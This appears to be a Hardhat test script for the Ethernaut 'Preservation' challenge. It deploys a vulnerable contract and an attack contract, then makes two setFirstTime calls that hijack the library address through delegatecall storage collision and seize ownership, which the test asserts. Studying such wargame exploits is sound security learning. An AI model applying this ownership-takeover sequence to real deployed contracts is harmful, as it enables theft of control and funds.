const { loadFixture } = require("@nomicfoundation/hardhat-network-helpers")
const { expect } = require("chai")
const { copyFileSync } = require("fs")
const { ethers } = require("hardhat")

describe("Preservation", () => {
  async function deployFallbackFixture () {
    const [deployer, attacker] = await ethers.getSigners()

    // 部署timeZone1Library
    const timeZone1Factory = await ethers.getContractFactory("LibraryContract")
    const timeZone1 = await timeZone1Factory.connect(deployer).deploy()
    await timeZone1.waitForDeployment()
    const timeZone1Address = timeZone1.getAddress()

    // timeZone2Library
    const timeZone2Factory = await ethers.getContractFactory("LibraryContract")
    const timeZone2 = await timeZone2Factory.connect(deployer).deploy()
    await timeZone2.waitForDeployment()
    const timeZone2Address = timeZone2.getAddress()

    const ContractFactory = await ethers.getContractFactory("Preservation")
    const contract = await ContractFactory.connect(deployer).deploy(timeZone1Address, timeZone2Address)
    await contract.waitForDeployment()
    const contractAddress = await contract.getAddress()

    const AttackContractFactory = await ethers.getContractFactory("AttackPreservation")
    const attackContract = await AttackContractFactory.connect(attacker).deploy()
    await attackContract.waitForDeployment()

    return { contract, attacker, attackContract }
  }

  it("Should consecutiveWins ", async () => {
    const { contract, attacker, attackContract } = await loadFixture(deployFallbackFixture)

    console.log(`攻击前Preservation的owner：${await contract.owner()}`)
    // 第一次攻击，改变timeZone1Library
    const firstTx = await contract.connect(attacker).setFirstTime(await attackContract.getAddress())
    await firstTx.wait()

    // 第二次攻击，改变owner
    const secondTx = await contract.connect(attacker).setFirstTime(await attackContract.getAddress())
    await secondTx.wait()

    // 断言
    expect(await contract.owner()).to.equal(attacker.address)

  })
})